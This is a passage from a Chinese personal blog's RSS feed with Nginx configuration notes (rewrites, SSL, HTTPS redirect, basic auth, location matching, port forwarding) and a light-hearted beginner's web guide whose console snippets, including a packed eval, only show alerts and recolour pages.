^/(.*)$  /$1 break;# 隐式重定向</span></span><br><span class="line"><span class="comment">#2# proxy_pass https://quartz010.github.io;# 显式重定向</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的重定向方式有两种，不过严格意义上讲，通过<code>proxy_pass</code>实现的只能叫做反向代理。不过这里用到了实现 Url不改变的重定向，也权且这样叫吧。 后面讲路由重写，这里先看这个正则表达式 <code>^/(.*)$</code> 代表以 <code>/</code> 开头中间匹配 <code>.*</code> (也就是任意个单字符)，之后再进行结尾。综上是匹配所有的路由。</p><h2 id="路由重写"><a href="#路由重写" class="headerlink" title="路由重写"></a>路由重写</h2><p>路由的重写，这里算得上是很重要的一个模块了。一般 Nginx 默认编译需要 加上 Pcre 的正则的库，其基本语法如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">rewrite</span> 规则 定向路径 重写类型;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>规则：用于匹配的 URL 或者是正则表达式。</li><li>重定向之后的链接，可以带参数</li><li><p>重写类型：</p><ul><li>last ：表示完成rewrite，浏览器地址栏URL地址不变</li><li>break：本条规则匹配完成后，终止匹配，不再匹配后面的规则，浏览器地址栏URL地址不变</li><li>redirect：返回302临时重定向，浏览器地址会显示跳转后的URL地址</li><li>permanent：返回301永久重定向，浏览器地址栏会显示跳转后的URL地址</li></ul></li><li><p><strong>作用域:</strong> <em>server, location, if</em></p></li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">rewrite</span><span class="regexp"> ^(.*)$</span>  https://<span class="variable">$host</span><span class="variable">$1</span> <span class="literal">permanent</span></span><br></pre></td></tr></table></figure><p>这里的重写类型是可选项，也可以不进行指定。这里值得注意的是，last 和 break 类型的区别。last 可以理解为，对url改变之后，继续对url进行重写匹配，知道最后没有相关规则时候便停止。break 在完成本次的重写之后，就不进行后继的匹配重写。eg</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">rewrite</span> /<span class="number">111</span>/ /<span class="number">555</span>/ <span class="literal">last</span>;</span><br><span class="line">        <span class="attribute">rewrite</span> /<span class="number">222</span>/ /<span class="number">555</span>/ <span class="literal">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">location</span><span class="regexp"> ^~</span> /<span class="number">555</span>/ &#123;</span><br><span class="line">        internal;</span><br><span class="line">        empty_gif;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">403</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这样的配置下。得到的结果是 访问 <code>/111/</code> 的时候，直接返回了403的页面。而访问 <code>/222/</code> 的时候，得到了404的返回。不过，值得注意的是， <code>111</code> 返回了 403 的内容，但是实际上的 URL 并没有发生改变。即：</p><p><strong>xxx/111/ 的 URL 实际上是返回了 /555/ 的内容</strong>  </p><h2 id="SSL-配置"><a href="#SSL-配置" class="headerlink" title="SSL 配置"></a>SSL 配置</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>SSL 在http的具体应用就是 HTTPS （<strong>HTTP over TLS</strong>）。</p><blockquote><p>HTTPS的主要思想是在不安全的网络上创建一安全信道，并可在使用适当的加密包和<em>服务器证书可被验证且可被信任时</em>，对<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU3JUFCJThBJUU4JTgxJUJE" title="https://zh.wikipedia.org/wiki/%E7%AB%8A%E8%81%BD">窃听<i class="fa fa-external-link"></i></span>和<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU0JUI4JUFEJUU5JTk3JUI0JUU0JUJBJUJBJUU2JTk0JUJCJUU1JTg3JUJC" title="https://zh.wikipedia.org/wiki/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB">中间人攻击<i class="fa fa-external-link"></i></span>提供合理的防护。</p></blockquote><p>一样回到PKI（Public Key Instruction）的体系里面，其中一个重要的概念就是 HTTPS 的证书。</p><p>在普通的点对点加密里面，另个客户端可以直接进行秘钥的商定。</p><p>但是在 BS 里面，服务器将面临多个客户端的请求，如果使用自签发证书，会出现证书可能会被伪造。可能会有其他的客户端使用伪造的证书进行HTTPS通信。</p><p>常见的应用在于使用 <strong>SSLstrip</strong> 进行证书伪造攻击，以实现把HTTPS流量降级到HTTP。</p><p>为了<strong>避免</strong>这样的情况出现，这里就出现了 CA机构（Certificate Authority）用于进行一个可信的第三方证书保管。证书由可信第三方提供，不是直接从服务器获得，所以保护了证书被伪造的可能。</p><h3 id="证书配置"><a href="#证书配置" class="headerlink" title="证书配置"></a>证书配置</h3><p>直接在云服务商的website上面申请域名证书，这里申请的是针对 <a href="">mine.diglp.xyz</a> 的单域名证书。可以免费申请。不过 CA 机构是 <strong>TrustAsia</strong> 据说这个真的不值得Trust。。。这就另说了。</p><p>这里了解一下文件分布：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">|-- Apache</span><br><span class="line">|   |-- 1_root_bundle.crt</span><br><span class="line">|   |-- 2_mine.diglp.xyz.crt</span><br><span class="line">|   `-- 3_mine.diglp.xyz.key</span><br><span class="line">|-- IIS</span><br><span class="line">|   `-- mine.diglp.xyz.pfx</span><br><span class="line">|-- Nginx</span><br><span class="line">|   |-- 1_mine.diglp.xyz_bundle.crt</span><br><span class="line">|   `-- 2_mine.diglp.xyz.key</span><br><span class="line">`-- Tomcat</span><br><span class="line">    `-- mine.diglp.xyz.jks</span><br></pre></td></tr></table></figure><p>tree 一下目录，可见已经根据不同的Server给分成了不同的类型。内容都是一样，进行了一定程度的合并和拆分而已</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssl_certificate</span> <span class="string">"/xxx/1_mine.diglp.xyz_bundle.crt"</span>;                    </span><br><span class="line"><span class="attribute">ssl_certificate_key</span> <span class="string">"/xxx/2_mine.diglp.xyz.key"</span>;           </span><br><span class="line"><span class="attribute">ssl_session_cache</span> shared:SSL:<span class="number">1m</span>;                                             </span><br><span class="line"><span class="attribute">ssl_session_timeout</span>  <span class="number">10m</span>;                                                    </span><br><span class="line"><span class="attribute">ssl_ciphers</span> HIGH:!aNULL:!MD5;                                                </span><br><span class="line"><span class="attribute">ssl_prefer_server_ciphers</span> <span class="literal">on</span>;</span><br></pre></td></tr></table></figure><p>这样就很轻松的完成了Https的配置。</p><h2 id="全站使用-HTTPS-的实现"><a href="#全站使用-HTTPS-的实现" class="headerlink" title="全站使用 HTTPS 的实现"></a>全站使用 HTTPS 的实现</h2><p>这里很巧妙的使用了重定向，实现了全站的HTTPS。通过对HTTP流量进行重定向实现</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line"><span class="attribute">listen</span> <span class="number">80</span> default_server;</span><br><span class="line">    <span class="comment">#listen [::]:80;</span></span><br><span class="line">    <span class="attribute">return</span> <span class="number">301</span> https://<span class="variable">$host</span>:9943<span class="variable">$request_uri</span>;</span><br><span class="line">    <span class="comment">#rewrite ^(.*)$  https://$host$1 permanent;</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>这里对所有的请求，直接重定向到HTTPS。很是巧妙</p><h2 id="后面的话"><a href="#后面的话" class="headerlink" title="后面的话"></a>后面的话</h2><p>很多事，很多事，面对审判吧。</p><p>用的就记录下来</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2019/02/08/OP_Nginx%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0%EF%BC%88SSL%E9%85%8D%E7%BD%AE%E4%BB%A5%E5%8F%8A%E8%B7%AF%E7%94%B1%E9%87%8D%E5%86%99%EF%BC%89/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Nginx 折腾笔记 （路由配置以及认证）</title>
      <link>https://www.diglp.xyz/2019/02/07/OP_Nginx%20%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0%20%EF%BC%88%E8%B7%AF%E7%94%B1%E9%85%8D%E7%BD%AE%E4%BB%A5%E5%8F%8A%E8%AE%A4%E8%AF%81%EF%BC%89/</link>
      <guid>https://www.diglp.xyz/2019/02/07/OP_Nginx%20%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0%20%EF%BC%88%E8%B7%AF%E7%94%B1%E9%85%8D%E7%BD%AE%E4%BB%A5%E5%8F%8A%E8%AE%A4%E8%AF%81%EF%BC%89/</guid>
      <pubDate>Wed, 06 Feb 2019 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前面的话&quot;&gt;&lt;a href=&quot;#前面的话&quot; class=&quot;headerlink&quot; title=&quot;前面的话&quot;&gt;&lt;/a&gt;前面的话&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;2008年，第一款安卓手机诞生，HTC
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前面的话"><a href="#前面的话" class="headerlink" title="前面的话"></a>前面的话</h2><blockquote><p>2008年，第一款安卓手机诞生，HTC G1。智能手机的十年，像是人类的一个世纪</p><p>在十年前的时候，互联网哪里有普及呢？</p><p>十年之后，世界又将怎样？</p><p>每种技能的经济价值是很快会下降的</p></blockquote><hr><p>又是拖延症爆炸的时间，这篇博文开了都自己墨迹了这么久，竟然几天之后才开始继续写，没救了。</p><p>这篇主要就是写，Nignx 的路由匹配，和一些基本的认证操作。</p><h2 id="Nginx-的认证配置"><a href="#Nginx-的认证配置" class="headerlink" title="Nginx 的认证配置"></a>Nginx 的认证配置</h2><p>这里使用 Nginx 的基础的身份认证功能，来实现对页面访问的授权访问。采用 <code>htpasswd</code> 来实现了鉴权。这个是 apache 的资自带的工具，这里也可以使用 <code>OpenSSL</code>来生成密码文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c "echo -n 'admin:' &gt;&gt; /etc/nginx/.htpasswd"</span><br><span class="line">sudo sh -c "openssl passwd -apr1 &gt;&gt; /etc/nginx/.htpasswd"</span><br></pre></td></tr></table></figure><hr><p>在 Nginx 的conf 文件中，在指定的路由路径的配置下面使用如下的配置语句：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">auth_basic</span> <span class="string">"Authorized users only"</span>;<span class="comment"># 验证提示框</span></span><br><span class="line"><span class="attribute">auth_basic_user_file</span> /home/.htpasswd;<span class="comment"># 鉴权密码文件</span></span><br></pre></td></tr></table></figure><p>在最终的 Nginx 配置里的实例配置如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span><span class="regexp"> ^~/asd/</span> &#123;</span><br><span class="line"><span class="attribute">auth_basic</span> <span class="string">"Is You?"</span>;</span><br><span class="line">    <span class="attribute">auth_basic_user_file</span> /etc/nginx/.htpasswd_k;    </span><br><span class="line">   </span><br><span class="line">    <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://localhost:5601/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样在对目的路由进行请求的时候，会被要求用户鉴权。</p><p>至此，配置完成</p><h2 id="Nginx-路由配置"><a href="#Nginx-路由配置" class="headerlink" title="Nginx 路由配置"></a>Nginx 路由配置</h2><p><code>location</code> 在 Nginx 里面是相当常见的，用于对路由路径的匹配。</p><p>通配符在这里是一个重点，</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">location [=|~|~*|^~] /uri/ &#123; … &#125;</span><br><span class="line">location modifier uri &#123;...&#125;</span><br></pre></td></tr></table></figure><h3 id="匹配类型"><a href="#匹配类型" class="headerlink" title="匹配类型"></a>匹配类型</h3><table><thead><tr><th>匹配类型</th><th>描述</th></tr></thead><tbody><tr><td>=</td><td>完全匹配 斜杠都不能多</td></tr><tr><td>~</td><td>大小写敏感 pattern 是正则表达式</td></tr><tr><td>(None)</td><td>匹配相似的部分pattern 部分相似即匹配</td></tr><tr><td>~*</td><td>大小写不敏感 pattern 是正则表达式</td></tr><tr><td>^~</td><td>和 None 类似，但是一旦匹配，即停止匹配</td></tr><tr><td>@</td><td>只能被内部访问 同 internal？</td></tr></tbody></table><h3 id="匹配示例"><a href="#匹配示例" class="headerlink" title="匹配示例"></a>匹配示例</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span><span class="regexp"> ^~</span> /us/ &#123;</span><br><span class="line"><span class="attribute">auth_basic</span> <span class="string">"Is You?"</span>;</span><br><span class="line">    <span class="attribute">auth_basic_user_file</span> /etc/nginx/.htpasswd;</span><br><span class="line">    <span class="attribute">alias</span> /usr/share/nginx/html/us/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里使用 <code>^~</code> 修饰符指定了是部分匹配的，但是使用了 <code>/xxx/</code> 的结构基本上也是实现了完全匹配。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line"><span class="attribute">proxy_pass</span>   http://127.0.0.1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大小写匹配的正则表达式，匹配以 <code>.php</code> 结尾的项目，转发到 fastcgi。<code>\.</code> 是转义的 <code>.</code></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> <span class="regexp">~* .(gif|jpg|jpeg)$</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2019/02/07/OP_Nginx%20%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0%20%EF%BC%88%E8%B7%AF%E7%94%B1%E9%85%8D%E7%BD%AE%E4%BB%A5%E5%8F%8A%E8%AE%A4%E8%AF%81%EF%BC%89/#disqus_thread</comments>
    </item>
    
    <item>
      <title>写给小安的WEB入坑指南</title>
      <link>https://www.diglp.xyz/2019/01/30/web_%E5%86%99%E7%BB%99%E5%B0%8F%E5%AE%89%E7%9A%84WEB%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97/</link>
      <guid>https://www.diglp.xyz/2019/01/30/web_%E5%86%99%E7%BB%99%E5%B0%8F%E5%AE%89%E7%9A%84WEB%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97/</guid>
      <pubDate>Tue, 29 Jan 2019 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;什么是web&quot;&gt;&lt;a href=&quot;#什么是web&quot; class=&quot;headerlink&quot; title=&quot;什么是web&quot;&gt;&lt;/a&gt;什么是web&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;web（World Wide
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="什么是web"><a href="#什么是web" class="headerlink" title="什么是web"></a>什么是web</h2><blockquote><p>web（World Wide Web）即全球广域网，也称为万维网，它是一种基于超文本和HTTP的、全球性的、动态交互的、跨平台的分布式图形信息系统。</p></blockquote><p>这里引用自百科，这这里就粗浅的理解为我们的网站吧。</p><h2 id="前端和后端"><a href="#前端和后端" class="headerlink" title="前端和后端"></a>前端和后端</h2><p>WEB的结构是 <code>B/S</code>模式（Browser/Server，浏览器/服务器模式），这种模式区别于 <code>C/S</code> （Client/Server）模式。</p><p>（想想CS模式，常见的是我们的桌面软件（QQ，etc）），所以 BS 的特点就是<strong>功能在服务器的高度集中</strong>，使用浏览器就可以和所需的不同服务进行交互。</p><hr><p>前端后端，是我们在web方面听到的较多的词汇，其实际上的功能是什么呢？</p><h3 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h3><p><strong>提词：</strong></p><ul><li>HTML （How to meet lady）（页面的主体，可以理解为ppt的内容）</li><li>CSS        （决定ppt内容的样子，方的圆的）</li><li>JavaScript    （赋予了页面动态的效果）</li><li>BootStrap    （用于设计界面的一个框架）</li><li>JQuery        （用于更好的动态功能的组件）</li><li>…</li></ul><p>好，上面的名词看晕了，那么现在就来看看什么是前端。</p><p>简单切不严谨的说，用户通过浏览器直接接触到的东西就是前端。那么怎么讲呢？简单！按一下 <code>F12</code>就看见了熙熙攘攘的代码堆起来了。</p><hr><p>鼠标在元素选项卡(Element)，选中 Html 中的不同标签，发现其是在页面中是一一对应的。所以说，页面的内容和我们 HTML 中的标签是一一对应的（不严谨），这样就可以得出结论，HTML 是页面的骨架对吧，构建出了整个页面的<strong>基本内容</strong>。</p><blockquote><p>HTML 就是PPT的内容，实现了基本的页面内容</p></blockquote><hr><p>接下来，就是介绍 JavaScript 的时候了，JS 这个名号听着厉害，实际上一直在浏览器上跑着呢。这里继续 <code>F12</code> 在里面找到 <strong>控制台(Console)</strong>，在里面输入：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="string">'love ann!'</span>);</span><br><span class="line">confirm(<span class="string">'Would U like be With me?'</span>);</span><br></pre></td></tr></table></figure><p>(如果看到这里，可以去跑一下晚上的神秘代码！)</p><p>所以 JS 的功能呢，就是可以赋予网页动态的灵魂（类比给 ppt 加上了动画），这样就可以实现很多炫酷的效果。这些代码在浏览器里偷偷运行着。</p><p>或者试试这个？</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$.map($(<span class="string">'div'</span>), <span class="function"><span class="keyword">function</span>(<span class="params">e,t,n</span>)</span>&#123;$(e).css(&#123;<span class="string">"background"</span>: <span class="string">"red"</span>&#125;);&#125;)</span><br></pre></td></tr></table></figure><p>红彤彤的，是不是一下子就过年了？？？</p><blockquote><p>JS 就是 PPT 里面的动画，实现了动态效果，比如点击消失</p></blockquote><hr><p>CSS （Cascading Style Sheets） 层叠样式表，是不是有些时候页面加载出来很奇怪？ 比如一堆内容堆在了屏幕的坐标，刷新几次就好了？ 这里就是这个CSS没有加载出来。</p><p>简单的说呢？ 这个东西是来配置一个<strong>页面元素</strong> 长什么样子的，怎么说呢？我们还是看上面的代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$.map($(<span class="string">'div'</span>), <span class="function"><span class="keyword">function</span>(<span class="params">e,t,n</span>)</span>&#123;$(e).css(&#123;<span class="string">"background"</span>: <span class="string">"red"</span>&#125;);&#125;)</span><br></pre></td></tr></table></figure><p>虽然有点晕晕的，不过我们看里面的部分 <code>css({&quot;background&quot;: &quot;red&quot;})</code> 是不是瞬间熟悉了，这里其实完成的就是对元素的样式进行了调整，把背景设置成了红彤彤。</p><hr><p>好的，前端我说完了 XD</p><h2 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h2><p><strong>提词：</strong></p><ul><li><p>Web服务器 Nginx Apache</p></li><li><p>数据库 Mysql， MongoDB，Redis …</p></li><li><p>PHP，Python，Java …</p></li><li><p>ThinkPHP，Django，Spring …</p></li><li><p>这里的词就有些模式了吧？ 慢慢来</p></li></ul><p>现在我们到了，后端了。这个又怎么说？一句话，用户摸不到的地方就是后端。怎么理解呢？</p><p>看我们平时登陆一些服务的时候，这个过程一定熟悉。我们的账户就保存在 后端的 数据库之中，每每我们登陆的时候，把账号密码发送给目标服务器，服务器帮我验证，你的密码和注册的时候是不是一样的，从而判断是不是你。（不可能放在前端对吧？否则 你 F12 就看见密码了，吼吼吼）</p><hr><p>先从 WEB服务器来讲吧，这到底是个啥呢？ </p><p>我们的Html文件，在本地磁盘上，我们直接双击打开，看已经打开了一个网页了对吧？</p><p>那么 WEB服务器 的功能，<strong>就是帮你找东西</strong>。比如我要访问这个链接</p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmRpZ2xwLnh5ei8yMDE5LzAxLzIwL05naW54JTIwbG9nL2luZGV4Lmh0bWw=" title="https://blog.diglp.xyz/2019/01/20/Nginx%20log/index.html">https://blog.diglp.xyz/2019/01/20/Nginx%20log/index.html<i class="fa fa-external-link"></i></span></p><p>分段来看：</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmRpZ2xwLnh5eg==" title="https://blog.diglp.xyz">https://blog.diglp.xyz<i class="fa fa-external-link"></i></span>                    这里就是访问了服务器对吧</li><li>/2019/01/20/Nginx%20log/index.html      这里呢？就是在服务器里面找东西了</li></ul><p>想想昨天的 <code>pwd</code> 是不是就好理解了？</p><hr><p>数据库，这里其实听名字就知道啦，存数据的地方。我们可以使用 <code>SQL</code> （Structured Query Language）语言，对数据进行查询。</p><p>MongoDB 是一种新式数据库，基于文件的  NoSQL， 突破了结构化的限制 是  <strong>NoSQL</strong> （Not Only）</p><p>Redis 实现在内存中实现数据存储，数据更快，一般用于请求量极大的数据，保持高命中率。</p><hr><p>编程语言，和编程框架，这里放在一起啦。上面的每一种语言 都可以轻松实现一个 hello world。</p><ul><li>PHP 本身是一种编程语言，是和 python 一个层级，.py 需要 python runtime 。.php 需要 php 的 runtime。两个东西都可以很简单的使用 <code>python x.py</code> 和 <code>php x.php</code> 的运行起来</li><li>当 python 使用 flask/Django 开始 web 开发的时候了。和 PHP 的 web 框架 (ThinkPHP) 作用在一个层级了。<strong>不准确的讲</strong>每次访问，都会启动一个进程，对这个脚本内的内容进行运行， 这里的运行是在服务器端的。对我的的请求进行解析，比如 url 的路由路径， 请求方式等进行响应。</li><li>这时候仍然是在服务器端， 进行数据库的增删查改。 把操作 (得到的数据，传递到前端) <code>index.php?category=x</code></li><li>前端进行数据获取，由 js 脚本，实现静态 html 的显示刷新</li></ul><p>XD 这里我从之前的地方 Copy了，饿了！</p><h2 id="后面的话"><a href="#后面的话" class="headerlink" title="后面的话"></a>后面的话</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="function"><span class="keyword">function</span>(<span class="params">p,a,c,k,e,d</span>)</span>&#123;e=<span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span>(c&lt;a?<span class="string">""</span>:e(<span class="built_in">parseInt</span>(c/a)))+((c=c%a)&gt;<span class="number">35</span>?<span class="built_in">String</span>.fromCharCode(c+<span class="number">29</span>):c.toString(<span class="number">36</span>))&#125;;<span class="keyword">if</span>(!<span class="string">''</span>.replace(<span class="regexp">/^/</span>,<span class="built_in">String</span>))&#123;<span class="keyword">while</span>(c--)d[e(c)]=k[c]||e(c);k=[<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> d[e]&#125;];e=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span><span class="string">'\\w+'</span>&#125;;c=<span class="number">1</span>;&#125;;<span class="keyword">while</span>(c--)<span class="keyword">if</span>(k[c])p=p.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'\\b'</span>+e(c)+<span class="string">'\\b'</span>,<span class="string">'g'</span>),k[c]);<span class="keyword">return</span> p;&#125;(<span class="string">'7["\\6\\8\\a\\9\\2"](\'\\1\\1\\5\\4\\3\\h\\g\\i\\k\\j\\c\\b\\0\\0\\d\\f\\e\');'</span>,<span class="number">21</span>,<span class="number">21</span>,<span class="string">'u661f|u563b|x74|u505a|uff01|u6bdb|x61|window|x6c|x72|x65|uff08|x7e|u773c|uff09|u2728|u5973|u6211|u670b|u5427|u53cb'</span>.split(<span class="string">'|'</span>),<span class="number">0</span>,&#123;&#125;))</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2019/01/30/web_%E5%86%99%E7%BB%99%E5%B0%8F%E5%AE%89%E7%9A%84WEB%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Nginx 折腾笔记（LB 和 Tunnel）</title>
      <link>https://www.diglp.xyz/2019/01/20/OP_Nginx%20%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0%EF%BC%88LB%20%E5%92%8C%20Tunnel%EF%BC%89/</link>
      <guid>https://www.diglp.xyz/2019/01/20/OP_Nginx%20%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0%EF%BC%88LB%20%E5%92%8C%20Tunnel%EF%BC%89/</guid>
      <pubDate>Sat, 19 Jan 2019 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前面的话&quot;&gt;&lt;a href=&quot;#前面的话&quot; class=&quot;headerlink&quot; title=&quot;前面的话&quot;&gt;&lt;/a&gt;前面的话&lt;/h2&gt;&lt;p&gt;突然又是折腾了一波nginx，其中一点点的配置和过程在这里记录一下。&lt;/p&gt;
&lt;p&gt;下午又把
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前面的话"><a href="#前面的话" class="headerlink" title="前面的话"></a>前面的话</h2><p>突然又是折腾了一波nginx，其中一点点的配置和过程在这里记录一下。</p><p>下午又把 《社交网络》这部片看了一遍，又是一种熟悉的热血沸腾的感觉。</p><p>思考自己仿佛也是在同样的年龄，但是，为什么却是那种的遥不可及的的感觉，</p><p>也许这个就是文化吧。一定去西海岸！</p><blockquote><p> drop the The, just Facebook</p></blockquote><hr><ol><li><p>这世道，绅士做不了。海盗才是王。</p></li><li><p>签任何协议之前至少看3遍以上。 </p></li><li>出卖你的往往是你最好的朋友</li></ol><h2 id="之前的场景"><a href="#之前的场景" class="headerlink" title="之前的场景"></a>之前的场景</h2><p>内网不通，怎么打洞，使得外网可以访问。内网打洞。</p><p>原始方案，两次端口转发，加上 VPN。这样实现协议栈倒是没有加其他的东西，都团原生的。</p><p>后面 想想，使用 <code>frp</code> 或者 <code>ngrok</code>  直接实现内网的转发，到还是一个更好的方法了。之前的只是赞成做了个理论性的尝试，没想到，ei？还真是能用。</p><hr><p>方案的两次转发，主要在于，不同网段之间的转发。</p><ol><li>由服务器 外网的网段， 转发到 VPN 的子网网段的内网主机 IP</li><li>在内网主机上，由VPN的子网网段，转发到内网网卡</li><li>并且设置内网的网卡路由走内网网关</li></ol><hr><h2 id="Nginx-Port-forwarding-and-Load-Balance"><a href="#Nginx-Port-forwarding-and-Load-Balance" class="headerlink" title="Nginx Port forwarding and Load Balance"></a>Nginx Port forwarding and Load Balance</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">stream</span> &#123;</span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">        <span class="attribute">proxy_pass</span> <span class="number">127.0.0.1:7000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置文件很容易的实现了 <strong>80到7000端口</strong> 的转发，</p><p>下面的配置很容易实现转发的 <strong>LB</strong> 这里就会有很好的用处</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">stream</span> &#123;</span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">        <span class="attribute">proxy_pass</span> frp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">upstream</span> frp&#123;</span><br><span class="line">        <span class="attribute">server</span> <span class="number">127.0.0.1:7000</span>;</span><br><span class="line">        <span class="attribute">server</span> <span 